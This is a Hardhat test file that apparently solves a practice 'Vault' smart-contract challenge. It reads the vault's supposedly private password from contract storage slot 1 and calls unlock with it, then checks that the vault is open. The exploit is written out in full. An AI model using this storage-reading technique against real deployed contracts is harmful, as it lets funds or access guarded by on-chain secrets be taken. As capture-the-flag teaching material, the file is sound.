const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Vault", async () => {
    let deployer, attacker

    before(async () => {
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('Vault', deployer);
        this.vault = await Factory.deploy(ethers.utils.randomBytes(32));

        expect(
            await this.vault.locked()
        ).to.be.eq(true);
    })

    it("Exploit", async () => {
        let victimContract = await this.vault.connect(attacker);
        let password = await ethers.provider.getStorageAt(victimContract.address, 1);
        await victimContract.unlock(password);
    })

    after(async () => {
        expect(
            await this.vault.locked()
        ).to.be.eq(false);
    })
})